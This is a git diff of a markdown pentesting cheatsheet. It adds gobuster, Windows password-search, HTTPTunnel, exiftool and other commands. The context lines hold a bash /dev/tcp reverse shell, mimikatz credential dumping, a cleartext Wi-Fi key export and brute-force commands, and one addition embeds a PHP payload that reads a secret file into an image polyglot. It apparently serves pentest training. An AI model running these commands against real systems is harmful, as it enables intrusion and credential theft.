@@ -47,7 +47,6 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Dirb](#dirb)
   - [Dnsrecon](#dnsrecon)
   - [Docker](#docker)
-  - [Empsave.dat](#empsavedat)
   - [Evil-winrm](#evil-winrm)
   - [Exiftool](#exiftool)
   - [Ffuf](#ffuf)
@@ -56,7 +55,6 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Foremost](#foremost)
   - [Gcc](#gcc)
   - [Git](#git)
-  - [Gobuster](#gobuster)
   - [Gpg](#gpg)
   - [Hashcat](#hashcat)
   - [Host](#host)
@@ -71,7 +69,6 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Kerberoast](#kerberoast)
   - [Ln](#ln)
   - [Ls](#ls)
-  - [Mailman.com_ips.txt](#mailmancom_ipstxt)
   - [Man](#man)
   - [Masscan](#masscan)
   - [Medusa](#medusa)
@@ -265,7 +262,7 @@ cd cheatsheet-pentesting
   ```bash
   nmap -O <target-IP>
   ```
-
+---
 ### Gobuster
 - **Directory Enumeration**:
   ```bash
@@ -275,8 +272,22 @@ cd cheatsheet-pentesting
 - **DNS Subdomain Enumeration**:
   ```bash
   gobuster dns -d <target-domain> -w /path/to/wordlist.txt
+  gobuster dns -d Domain.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+  ```
+- **Directory Search (Brute Force Directory Discovery) with Disabling SSL verification**:
+  ```bash
+  gobuster dir -u https://10.11.1.237/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
   ```
 
+- **Authenticated Search (Directory Brute Forcing with Authentication) with Basic authentication**:
+  ```bash
+  gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://192.168.120.73/svn
+  ```
+- **Brute Force Extensions (Try Various File Extensions)**:
+  ```bash
+  gobuster dir -u 192.168.1.33 -x php,html,zip -t 130 -w ~/wordlists/big.txt
+  ```
+---
 ### Metasploit
 - **Start Metasploit Console**:
   ```bash
@@ -292,7 +303,7 @@ cd cheatsheet-pentesting
   ```bash
   use <exploit-path>
   ```
-
+---
 ### Netcat
 - **Set Up a Listener**:
   ```bash
@@ -308,7 +319,7 @@ cd cheatsheet-pentesting
   ```bash
   bash -i >& /dev/tcp/<your-IP>/4444 0>&1
   ```
-
+---
 ### SearchSploit
 - **Search for Exploits**:
   ```bash
@@ -319,7 +330,7 @@ cd cheatsheet-pentesting
   ```bash
   searchsploit -m <exploit-path>
   ```
-
+---
 ### TCPDump
 - **Capture Traffic on an Interface**:
   ```bash
@@ -335,7 +346,7 @@ cd cheatsheet-pentesting
   ```bash
   tcpdump -i <interface> port 80
   ```
-
+---
 ### GMSAPasswordReader
 - **Retrieve gMSA Password**:
   ```powershell
@@ -940,14 +951,6 @@ cd cheatsheet-pentesting
 
 ---
 
-### empsave.dat
-- **Extract Passwords from empsave.dat**:
-  ```bash
-  python3 empsave.py empsave.dat
-  ```
-
----
-
 ### evil-winrm
 - **Start Evil-WinRM Session**:
   ```bash
@@ -971,6 +974,10 @@ cd cheatsheet-pentesting
   ```bash
   exiftool -<field-name> <file>
   ```
+- **Using exiftool to Embed a PHP Payload in an Image (Polyglot File)**:
+  ```bash
+  exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/user/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+  ```
 
 ---
 
@@ -988,27 +995,49 @@ cd cheatsheet-pentesting
 ---
 
 ### find
-- **Search for Files by Name**:
+- **Search for Files by Name (linux)**:
   ```bash
   find /path/to/search -name "<file-name>"
   ```
 
-- **Search Files by Permission**:
+- **Search Files by Permission (linux)**:
   ```bash
   find /path/to/search -perm <permission>
+  ```
+- **Using find to Search for a Keyword in a Specific File (Windows)**:
+  ```bash
+  find "password" C:\Users\Offsec\importantfile.txt
+  ```
+
+- **Using type to Display File Contents and then Search with find (Windows)**:
+  ```bash
+  type importantfile.txt | find "password"
+  ```
+- **Using dir to List Files and Search for a Keyword in Directory Names (Windows)**:
+  ```bash
+  dir | find "important"
   ```
 
 ---
 
 ### findstr
-- **Search for String in Files**:
+- **Search for String in Files (Windows)**:
   ```bash
   findstr "<string>" <file>
   ```
 
-- **Search in Files Recursively**:
+- **Search in Files Recursively (Windows)**:
   ```bash
   findstr /s "<string>" <directory-path>\*.*
+  ```
+- **Using findstr to Search for Multiple Strings in a File (Windows)**:
+  ```bash
+  findstr "Johnny password" importantfile.txt
+  ```
+
+- **Using findstr with Case-Insensitive Search for "password"**:
+  ```bash
+  findstr /si "password"
   ```
 
 ---
@@ -1023,6 +1052,10 @@ cd cheatsheet-pentesting
   ```bash
   foremost -t <file-types> -i <image-file> -o <output-dir>
   ```
+- **Using foremost to Recover PDF Files from a Disk Image (Linux**:
+  ```bash
+  sudo foremost -v -q -t pdf -i /dev/sda1 -o ./Recovery
+  ```
 
 ---
 
@@ -1036,6 +1069,15 @@ cd cheatsheet-pentesting
   ```bash
   gcc -g -o <output-file> <source-file.c>
   ```
+- **Installing GCC for Multilib Support (64-bit and 32-bit compilation)**:
+  ```bash
+  sudo apt-get install gcc-multilib
+  ```
+
+- **Installing Mingw-w64 (Cross-Compiler for Windows)**:
+  ```bash
+  apt-get install mingw-w64 -y
+  ```
 
 ---
 
@@ -1044,7 +1086,7 @@ cd cheatsheet-pentesting
   ```bash
   git clone <repository-url>
   ```
-
+---
 - **Check the Status of a Git Repository**:
   ```bash
   git status
@@ -1064,7 +1106,7 @@ cd cheatsheet-pentesting
   ```bash
   gpg --gen-key
   ```
-
+---
 ### Hashcat
 - **Start Hashcat with a Wordlist**:
   ```bash
@@ -1080,7 +1122,7 @@ cd cheatsheet-pentesting
   ```bash
   hashcat --session <session_name> --restore
   ```
-
+---
 ### Host
 - **Lookup an IP Address for a Hostname**:
   ```bash
@@ -1091,18 +1133,35 @@ cd cheatsheet-pentesting
   ```bash
   host <IP_address>
   ```
-
+---
 ### HTTPTunnel
-- **Create an HTTP Tunnel Client**:
+- **Installing HTTPTunnel from the Kali Linux repositories**:
   ```bash
-  httptunnel -c <client_port> <server_host>:<server_port>
+  apt-cache search httptunnel
+  sudo apt install httptunnel
   ```
 
 - **Start an HTTP Tunnel Server**:
   ```bash
   httptunnel -s <server_port>
   ```
+- **Create an HTTP Tunnel Client**:
+  ```bash
+  httptunnel -c <client_port> <server_host>:<server_port>
+  ```
 
+- ** Forwarding TCP Port 8888 on the Linux Machine to TCP Port 3389 on the Windows Server 2016 System
+# Setting up the server component of HTTPTunnel: Setting up the server and the client component of HTTPTunnel**:
+  ```bash
+  ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+  hts --forward-port localhost:8888 1234        # the server component of HTTPTunnel
+  htc --forward-port 8080 10.11.0.128:1234       # the client component of HTTPTunnel
+  ```
+  - **Create an HTTP Tunnel Client**:
+  ```bash
+  httptunnel -c <client_port> <server_host>:<server_port>
+  ```
+---
 ### Hydra
 - **Brute Force SSH Login**:
   ```bash
@@ -1113,13 +1172,24 @@ cd cheatsheet-pentesting
   ```bash
   hydra -L <user_list> -P <password_list> http-get://<target_ip>
   ```
-
+---
 ### ICACLS
 - **Display File Permissions**:
   ```cmd
-  icacls <file>
+  icacls <file/folder>
   ```
-
+- **Using icacls on the Music directory**:
+  ```cmd
+  icacls Music
+  ```
+- **Using icacls to grant permissions**:
+  ```cmd
+  icacls Music /grant Susan:(OI)(CI)(F)
+  ```
+- **Using icacls to check and propagate permissions recursively**:
+  ```cmd
+  icacls Music /t /c
+  ```
 - **Grant Permissions**:
   ```cmd
   icacls <file> /grant <user>:(<permissions>)
@@ -1129,18 +1199,22 @@ cd cheatsheet-pentesting
   ```cmd
   icacls <file> /remove <user>
   ```
-
+---
 ### Iconv
 - **Convert File Encoding**:
   ```bash
   iconv -f <source_encoding> -t <target_encoding> <input_file> -o <output_file>
   ```
 
+- **Convert the file test.txt from ASCII to UTF-8 encoding and save it as test2.txt**:
+  ```bash
+  iconv -f ASCII -t UTF-8 test.txt -o test2.txt
+  ```
 - **Check Supported Encodings**:
   ```bash
   iconv --list
   ```
-
+---
 ### Impacket
 - **Run SMB Server**:
   ```bash
@@ -1151,7 +1225,7 @@ cd cheatsheet-pentesting
   ```bash
   impacket-psexec <target_ip> -u <username> -p <password> <command>
   ```
-
+---
 ### IP
 - **Show IP Address of Interfaces**:
   ```bash
@@ -1167,7 +1241,11 @@ cd cheatsheet-pentesting
   ```bash
   ip addr del <IP_address>/<CIDR> dev <interface>
   ```
-
+- **Adding a route to the network 10.13.37.0/24 via the eth1 interface**:
+  ```bash
+  ip route add 10.13.37.0/24 dev eth1
+  ```
+---
 ### IPTables
 - **List Rules**:
   ```bash
@@ -1183,7 +1261,7 @@ cd cheatsheet-pentesting
   ```bash
   iptables -A INPUT -s <IP_address> -j DROP
   ```
-
+---
 ### John
 - **Run John the Ripper on a Password File**:
   ```bash
@@ -1194,7 +1272,7 @@ cd cheatsheet-pentesting
   ```bash
   john --show <password_file>
   ```
-
+---
 ### Kerberoast
 - **Request a Service Ticket**:
   ```bash
@@ -1205,7 +1283,7 @@ cd cheatsheet-pentesting
   ```bash
   python kerberoast.py -t <ticket_file>
   ```
-
+---
 ### LN
 - **Create a Symbolic Link**:
   ```bash
@@ -1216,13 +1294,12 @@ cd cheatsheet-pentesting
   ```bash
   ln <target_file> <link_name>
   ```
-
+---
 ### LS
 - **List Files in a Directory**:
   ```bash
   ls
   ```
-
 - **Show Detailed Information**:
   ```bash
   ls -l
@@ -1232,24 +1309,42 @@ cd cheatsheet-pentesting
   ```bash
   ls -a
   ```
-
-### Mailman.com_ips.txt
-- **Read IPs from a File and Ping Them**:
+- **List files in the current directory and sort them alphabetically**:
   ```bash
-  while read ip; do ping -c 1 $ip; done < mailman.com_ips.txt
+  ls | sort
+  ```
+- **List all files (including hidden files) with detailed information, sorted by modification time, in human-readable format**:
+  ```bash
+  ls -laht
   ```
 
+- **List files and directories sorted by modification time (showing only the most recent file)**:
+  ```bash
+  ls -l --sort=time
+  ```
+---
 ### Man
 - **View Manual Page of a Command**:
   ```bash
   man <command>
+  man passwd
   ```
 
 - **Search for a Keyword in Manuals**:
   ```bash
   man -k <keyword>
+  man -k passwd
+  ```
+- ** Search the manual pages for exactly the word 'passwd' (as a whole word)**:
+  ```bash
+  man -k '^passwd$'
   ```
 
+- **Display the manual for the configuration file for 'passwd'**:
+  ```bash
+  man 5 passwd
+  ```
+---
 ### Masscan
 - **Scan an IP Range for Open Ports**:
   ```bash
@@ -1260,7 +1355,7 @@ cd cheatsheet-pentesting
   ```bash
   masscan <IP_range> -p<ports> --rate=<rate>
   ```
-
+---
 ### Medusa
 - **Brute Force Login for FTP**:
   ```bash
@@ -1271,7 +1366,7 @@ cd cheatsheet-pentesting
   ```bash
   medusa -h <host> -u <username> -P <password_list> -M ftp -t <threads>
   ```
-
+---
 ### Mimikatz
 - **Dump User Credentials**:
   ```cmd
@@ -1281,7 +1376,7 @@ cd cheatsheet-pentesting
 - **Export Credentials to a File**:
   ```cmd
   mimikatz "privilege::debug" "sekurlsa::logonpasswords" > credentials.txt
-  
+---  
 ### MinGW-64
 - **Compile a C Program**:
   ```bash
@@ -1292,7 +1387,7 @@ cd cheatsheet-pentesting
   ```bash
   x86_64-w64-mingw32-gcc -g <source_file>.c -o <output_file>.exe
   ```
-
+---
 ### Mklink
 - **Create a Symbolic Link**:
   ```cmd
@@ -1308,7 +1403,7 @@ cd cheatsheet-pentesting
   ```cmd
   mklink /J <junction_name> <target_path>
   ```
-
+---
 ### Mosquitto_sub
 - **Subscribe to a Topic**:
   ```bash
@@ -1319,7 +1414,7 @@ cd cheatsheet-pentesting
   ```bash
   mosquitto_sub -h <broker_address> -u <username> -P <password> -t <topic>
   ```
-
+---
 ### Mount
 - **Mount a Filesystem**:
   ```bash
@@ -1335,7 +1430,7 @@ cd cheatsheet-pentesting
   ```bash
   mount
   ```
-
+---
 ### Msfvenom
 - **Generate a Reverse Shell Payload**:
   ```bash
@@ -1346,7 +1441,7 @@ cd cheatsheet-pentesting
   ```bash
   msfvenom -l payloads
   ```
-
+---
 ### MySQL
 - **Log in to MySQL**:
   ```bash
@@ -1373,7 +1468,7 @@ cd cheatsheet-pentesting
   ```bash
   nbtscan -v <IP_range>
   ```
-
+---
 ### Nessus
 - **Start Nessus Service**:
   ```bash
@@ -1384,7 +1479,7 @@ cd cheatsheet-pentesting
   ```bash
   systemctl status nessusd
   ```
-
+---
 ### Net
 - **List Shared Resources**:
   ```cmd
@@ -1395,7 +1490,7 @@ cd cheatsheet-pentesting
   ```cmd
   net stop <service_name>
   ```
-
+---
 ### Netsh
 - **Show Wireless Profiles**:
   ```cmd
@@ -1406,7 +1501,7 @@ cd cheatsheet-pentesting
   ```cmd
   netsh wlan export profile name="<profile_name>" key=clear folder=<output_folder>
   ```
-
+---
 ### Netstat
 - **Show All Connections**:
   ```bash
@@ -1422,7 +1517,7 @@ cd cheatsheet-pentesting
   ```bash
   netstat -p
   ```
-
+---
 ### Nslookup
 - **Query an IP Address**:
   ```bash
@@ -1433,7 +1528,7 @@ cd cheatsheet-pentesting
   ```bash
   nslookup <hostname> <DNS_server>
   ```
-
+---
 ### OneSixtyOne
 - **Scan SNMP Devices**:
   ```bash
@@ -1444,7 +1539,7 @@ cd cheatsheet-pentesting
   ```bash
   onesixtyone -s <community_string> <IP_range>
   ```
-
+---
 ### OpenSSL
 - **Generate a Private Key**:
   ```bash
@@ -1455,7 +1550,7 @@ cd cheatsheet-pentesting
   ```bash
   openssl req -x509 -new -key private.key -out cert.pem -days 365
   ```
-
+---
 ### Passwd
 - **Change Your Password**:
   ```bash
@@ -1466,7 +1561,7 @@ cd cheatsheet-pentesting
   ```bash
   sudo passwd <username>
   ```
-
+---
 ### PHPGGC
 - **Generate a PHP Gadget Chain**:
   ```bash
@@ -1477,7 +1572,7 @@ cd cheatsheet-pentesting
   ```bash
   phpggc -l
   ```
-
+---
 ### Plink
 - **Initiate an SSH Connection**:
   ```bash
@@ -1487,7 +1582,8 @@ cd cheatsheet-pentesting
 - **Execute a Command on a Remote Host**:
   ```bash
   plink -ssh <username>@<host> <command>
-  
+  ```
+---
 ### Powercat
 - **Start a Listener**:
   ```powershell
@@ -1509,7 +1605,7 @@ cd cheatsheet-pentesting
   ```powershell
   powershell -Command "<command>"
   ```
-
+---
 ### PsExec
 - **Execute a Command on a Remote Host**:
   ```cmd
@@ -1828,6 +1924,8 @@ cd cheatsheet-pentesting
 - **Extract a Tar Archive**:
   ```bash
   tar -xvf <archive.tar>
+  tar -zxvf accesslog.gz 
+  tar xvfj accesslog.tar.bz2
   ```
 
 ### Tasklist
@@ -1846,6 +1944,11 @@ cd cheatsheet-pentesting
   ```bash
   gnome-terminal --tab
   ```
+- ** Setting Proxy for the Terminal**:
+  ```bash
+  export https_proxy="http://intern.com:3128"
+  export http_proxy="http://intern.com:3128"
+  ```
 
 ### TheHarvester
 - **Gather Information about a Domain**:
@@ -1863,6 +1966,10 @@ cd cheatsheet-pentesting
   ```bash
   echo <string> | tr -d <chars>
   ```
+- **Remove newline characters from a file**:
+  ```bash
+  cat test | tr -d '\n'
+  ```
 
 ### UFW
 - **Allow a Port**:
@@ -1874,6 +1981,23 @@ cd cheatsheet-pentesting
   ```bash
   ufw status
   ```
+- **List available application profiles in UFW**:
+  ```bash
+  sudo ufw app list
+  ```
+
+- **Show detailed information about the SSH application profile**:
+  ```bash
+  sudo ufw app info SSH
+  ```
+- ** Allow SSH traffic through the firewall**:
+  ```bash
+  sudo ufw allow SSH
+  ```
+- **Enable the UFW firewall**:
+  ```bash
+  sudo ufw enable
+  ```
 
 ### Uname
 - **Print System Information**:
@@ -1884,6 +2008,14 @@ cd cheatsheet-pentesting
 - **Print Kernel Name**:
   ```bash
   uname -s
+  ```
+- **Display the version of the operating system**:
+  ```bash
+  uname -v
+  ```
+- **Display the kernel release version**:
+  ```bash
+  uname -r
   ```
 
 ### Watch
@@ -1897,6 +2029,11 @@ cd cheatsheet-pentesting
   watch -d <command>
   ```
 
+- ** Continuously monitor the status of files in a directory (ignoring certain paths) every second, highlighting differences**:
+  ```bash
+  watch -n 1 -d "find . -! -path './hooks/*' -! -path './info/*' | sort"
+  ```
+  -n option: every second, -d option: highlights the differences between the previous and the current output
 ### WC
 - **Count Lines in a File**:
   ```bash
@@ -1906,6 +2043,14 @@ cd cheatsheet-pentesting
 - **Count Words in a File**:
   ```bash
   wc -w <file>
+  ```
+- **Count the number of characters in test.txt**:
+  ```bash
+  wc -m < test.txt
+  ```
+- **Count the number of files and directories in the current directory**:
+  ```bash
+  ls -l | wc -l
   ```
 
 ### Webservers
